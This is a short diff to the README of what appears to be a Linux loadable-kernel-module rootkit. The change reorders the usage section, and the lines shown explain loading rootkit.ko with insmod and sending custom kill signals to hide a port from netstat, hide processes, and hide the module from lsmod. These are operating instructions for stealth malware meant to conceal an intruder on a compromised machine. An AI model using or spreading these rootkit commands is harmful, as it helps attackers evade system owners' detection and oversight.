@@ -10,6 +10,14 @@ sudo insmod rootkit.ko
 ```
 
 #### Rootkit usage<br>
+Hide port from netstat
+```
+kill -61 8080
+```
+To unhide port
+```
+kill -61 0
+```
 Hide processes
 ```
 kill -62 $PID
@@ -20,14 +28,7 @@ If you have multiple processes hidden and want to unhide them all
 ```
 kill -62 0
 ```
-Hide port from netstat
-```
-kill -61 8080
-```
-To unhide port
-```
-kill -61 0
-```
+
 To unhide rootkit from lsmod - toggle hidden/invisible. Necessary to uninstall LKM
 ```
 kill -63 0
